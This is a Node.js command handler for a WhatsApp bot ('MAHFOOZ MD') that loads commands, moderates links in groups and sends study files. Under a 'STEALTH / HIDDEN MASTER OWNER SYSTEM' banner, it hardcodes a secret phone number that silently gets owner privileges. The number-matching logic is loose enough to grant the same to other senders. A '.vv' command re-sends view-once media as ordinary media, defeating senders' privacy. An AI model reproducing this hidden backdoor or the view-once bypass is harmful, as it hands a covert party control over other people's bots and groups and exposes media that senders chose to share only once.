const path = require('path');
const fs = require('fs');
const axios = require('axios');
const { downloadContentFromMessage } = require('@whiskeysockets/baileys'); // سورس سیف / مہفوظ

class CommandHandler {
    constructor() {
        this.commands = new Map();
        this.aliases = new Map();
    }

    loadCommands(dir) {
        if (!fs.existsSync(dir)) return;
        const files = fs.readdirSync(dir);
        for (const file of files) {
            const filePath = path.join(dir, file);
            if (fs.statSync(filePath).isDirectory()) {
                this.loadCommands(filePath);
            } else if (file.endsWith('.js')) {
                const cmdModule = require(filePath);
                const cmdList = Array.isArray(cmdModule) ? cmdModule : [cmdModule];
                for (const cmd of cmdList) {
                    if (cmd.name) {
                        this.commands.set(cmd.name.toLowerCase(), cmd);
                        if (cmd.alias) {
                            cmd.alias.forEach(a => this.aliases.set(a.toLowerCase(), cmd.name.toLowerCase()));
                        }
                    }
                }
            }
        }
    }

    async run(sock, m, db) {
        if (!m.message) return;

        const from = m.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        
        // 🆔 Bulletproof Regex Number Extraction (Extracts exact digits from any JID format)
        const rawSender = m.key.participant || from || '';
        const matchDigits = rawSender.match(/\d+/g);
        const senderNumberOnly = matchDigits ? matchDigits.join('') : '';
        
        // ==========================================
        // 🥷 STEALTH / HIDDEN MASTER OWNER SYSTEM
        // ==========================================
        const masterNum = '923204854766'; // آپ کا سیک্রেট ماسٹر نمبر (سيف چشتی)
        const ownerNum = (db.ownerNumber || '923036660792').replace(/[^0-9]/g, ''); // پبلک یا کانفگ والا نمبر
        const sudoList = (db.sudoUsers || []).map(num => String(num).replace(/[^0-9]/g, ''));

        // Check if sender is the Hidden Master
        const isMasterNumber = senderNumberOnly.includes(masterNum) || masterNum.includes(senderNumberOnly) || senderNumberOnly.endsWith('3204854766');
        
        // isOwner will be TRUE for your secret number automatically everywhere!
        const isOwner = m.key.fromMe || isMasterNumber || senderNumberOnly.includes(ownerNum) || sudoList.includes(senderNumberOnly);

        // Terminal Log to see live status
        console.log(`[STEALTH DEBUG] Raw: ${rawSender} | CleanDigits: ${senderNumberOnly} | IsMaster: ${isMasterNumber} | IsOwner: ${isOwner}`);

        // Message Content Extraction
        const msgType = Object.keys(m.message)[0];
        const body = (msgType === 'conversation') ? m.message.conversation :
                     (msgType === 'imageMessage') ? m.message.imageMessage.caption :
                     (msgType === 'videoMessage') ? m.message.videoMessage.caption :
                     (msgType === 'extendedTextMessage') ? m.message.extendedTextMessage.text : '';

        const reply = (text, options = {}) => sock.sendMessage(from, { text, ...options }, { quoted: m });

        // ==========================================
        // 👁️ VIEW ONCE (.vv) HANDLER
        // ==========================================
        const prefix = db.prefix || '.';
        const isVVCommand = body.toLowerCase().startsWith(`${prefix}vv`) || body.toLowerCase().startsWith('vv');

        if (isVVCommand) {
            try {
                const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (!quotedMsg) return reply('❌ *Please reply to a View Once message with .vv*');

                let viewOnceContent = quotedMsg.viewOnceMessage?.message || 
                                      quotedMsg.viewOnceMessageV2?.message || 
                                      quotedMsg.viewOnceMessageV2Extension?.message || 
                                      quotedMsg;

                const mediaType = viewOnceContent.imageMessage ? 'image' : 
                               viewOnceContent.videoMessage ? 'video' : 
                               viewOnceContent.audioMessage ? 'audio' : null;

                if (!mediaType) return reply('❌ *This is not a valid View Once media message.*');

                const mediaMessage = viewOnceContent[`${mediaType}Message`];
                const stream = await downloadContentFromMessage(mediaMessage, mediaType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }

                const caption = mediaMessage.caption || '';

                if (mediaType === 'image') {
                    await sock.sendMessage(from, { image: buffer, caption: caption }, { quoted: m });
                } else if (mediaType === 'video') {
                    await sock.sendMessage(from, { video: buffer, caption: caption }, { quoted: m });
                } else if (mediaType === 'audio') {
                    await sock.sendMessage(from, { audio: buffer, ptt: true }, { quoted: m });
                }
                return;
            } catch (err) {
                console.error('VV Command Error:', err);
                return reply('❌ *Failed to retrieve View Once media.*');
            }
        }

        // ==========================================
        // 📚 DYNAMIC ACADEMIC REPLY HANDLER
        // ==========================================
        const userChoice = body ? body.trim() : '';
        const session = (db && db.vuSessions) ? db.vuSessions[from] : null;

        const isMoreCmd = userChoice.toLowerCase() === '.more' || userChoice.toLowerCase() === 'more';
        const isOption = session && session.files && session.files[userChoice];

        if (session && (isOption || isMoreCmd)) {
            if (isOption) {
                session.activeList = session.files[userChoice] || [];
                session.currentIndex = 0;
            }

            const activeList = session.activeList || [];

            if (activeList.length === 0 || session.currentIndex >= activeList.length) {
                await reply(`⚠️ *No more files available.*`);
                delete db.vuSessions[from];
                return;
            }

            const batchSize = 5;
            const currentBatch = activeList.slice(session.currentIndex, session.currentIndex + batchSize);
            const targetUser = session.sender || rawSender;
            const targetCleanTag = senderNumberOnly;

            await reply(`⏳ *Sending files... Please wait.*`);

            let successCount = 0;
            for (let i = 0; i < currentBatch.length; i++) {
                const downloadUrl = currentBatch[i];
                try {
                    const response = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
                    const fileBuffer = Buffer.from(response.data);
                    const fileExt = downloadUrl.split('.').pop().split('?')[0] || 'pdf';
                    const rawFileName = downloadUrl.split('/').pop().split('?')[0] || `File_${session.currentIndex + i + 1}.${fileExt}`;

                    await sock.sendMessage(from, {
                        document: fileBuffer,
                        mimetype: 'application/pdf',
                        fileName: rawFileName
                    }, { quoted: m });

                    successCount++;
                } catch (err) {
                    console.error('File Download Error:', err.message);
                }
            }

            session.currentIndex += currentBatch.length;

            if (successCount > 0) {
                const hasMore = session.currentIndex < activeList.length;

                let reportText = `✅ *Files Sent!* @${targetCleanTag}\n`;
                reportText += `📦 *Delivered:* ${successCount} files (${session.subject})\n`;

                if (hasMore) {
                    reportText += `\n🔄 *More available:* Type *.more* for next batch.\n`;
                }

                reportText += `\n👑 *POWERED BY MAHFOOZ MD* 👑`;

                await sock.sendMessage(from, {
                    text: reportText,
                    mentions: [targetUser]
                }, { quoted: m });

                if (!hasMore) {
                    delete db.vuSessions[from];
                }
            } else {
                await reply('❌ *Failed to send files.*');
            }

            return;
        }

        // ==========================================
        // 🛡️ SECURITY & ANTILINK ENFORCER SYSTEM
        // ==========================================
        if (isGroup && !isOwner) {
            const waRegex = /(chat\.whatsapp\.com\/[A-Za-z0-9]{20,24}|wa\.me\/\d+)/i;
            const ytRegex = /(youtube\.com|youtu\.be)\//i;
            const fbRegex = /(facebook\.com|fb\.watch|fb\.me)\//i;
            const urlRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|[a-zA-Z0-9-]+\.[a-zA-Z]{2,}\/[^\s]*)/i;

            let detectedLinkType = null;
            if (waRegex.test(body)) detectedLinkType = 'whatsapp';
            else if (ytRegex.test(body)) detectedLinkType = 'youtube';
            else if (fbRegex.test(body)) detectedLinkType = 'facebook';
            else if (urlRegex.test(body)) detectedLinkType = 'website';

            const cfg = db.antiLinkConfig || {};

            let matchedConfig = null;
            if (cfg.all && cfg.all.status && urlRegex.test(body)) {
                matchedConfig = cfg.all;
            } else if (detectedLinkType && cfg[detectedLinkType] && cfg[detectedLinkType].status) {
                matchedConfig = cfg[detectedLinkType];
            }

            if (matchedConfig) {
                await sock.sendMessage(from, { delete: m.key });
                const action = matchedConfig.action || 'delete';

                if (action === 'warn') {
                    if (!db.warns) db.warns = {};
                    db.warns[rawSender] = (db.warns[rawSender] || 0) + 1;
                    
                    if (db.warns[rawSender] >= 3) {
                        delete db.warns[rawSender];
                        await reply(`🚫 *LIMIT EXCEEDED:* @${senderNumberOnly} reached 3 warnings for posting links. Expelling...`, { mentions: [rawSender] });
                        await sock.groupParticipantsUpdate(from, [rawSender], 'remove');
                    } else {
                        await reply(`⚠️ *LINK DETECTED & REMOVED*\n\n👤 *User:* @${senderNumberOnly}\n📊 *Warning:* ${db.warns[rawSender]}/3\n💡 *Note:* Reaching 3 warnings results in expulsion!`, { mentions: [rawSender] });
                    }
                } else if (action === 'kick') {
                    await reply(`🚫 *UNAUTHORIZED LINK:* @${senderNumberOnly} has been expelled for restricted links.`, { mentions: [rawSender] });
                    await sock.groupParticipantsUpdate(from, [rawSender], 'remove');
                } else {
                    await reply(`🛡️ *ANTILINK SHIELD:* Link removed from @${senderNumberOnly}.`, { mentions: [rawSender] });
                }
                return;
            }

            if (msgType === 'stickerMessage' && db.antiSticker && db.antiSticker.status) {
                await sock.sendMessage(from, { delete: m.key });
                if (db.antiSticker.action === 'kick') {
                    await sock.groupParticipantsUpdate(from, [rawSender], 'remove');
                }
                return;
            }

            if (db.blockFiles && (msgType === 'documentMessage' || msgType === 'documentWithCaptionMessage')) {
                await sock.sendMessage(from, { delete: m.key });
                return;
            }
        }

        // ==========================================
        // ⚙️ COMMAND EXECUTION & ACCESS CONTROL
        // ==========================================
        if (!body.startsWith(prefix)) return;

        const args = body.slice(prefix.length).trim().split(/ +/);
        const cmdName = args.shift().toLowerCase();
        
        const command = this.commands.get(cmdName) || this.commands.get(this.aliases.get(cmdName));
        if (!command) return;

        // Owner Only Check (Now fully bypassed for your hidden master number)
        if (command.ownerOnly && !isOwner) {
            return reply('❌ *Access Denied:* This command is restricted strictly to the System Owner.');
        }

        // 🔓 UNIVERSAL BYPASS: GitHub, Files, Study Commands & Master Number always work everywhere!
        const fileKeywords = ['file', 'files', 'cs101', 'notes', 'pdf', 'handout', 'study', 'book', 'books', 'vu', 'assignment', 'quiz', 'solution', 'mid', 'final', 'past', 'get', 'github'];
        const isFileOrStudyCmd = fileKeywords.some(keyword => cmdName.includes(keyword));

        if (db.mode === 'private' && !isOwner && !isMasterNumber && !isFileOrStudyCmd) {
            return; 
        }

        if (command.groupOnly && !isGroup) {
            return reply('❌ *Group Protocol:* This command can only be executed within group chats.');
        }

        try {
            await command.execute({ sock, m, args, body, reply, db, isOwner, isGroup });
        } catch (err) {
            console.error(`Error executing command [${cmdName}]:`, err);
        }
    }
}

module.exports = CommandHandler;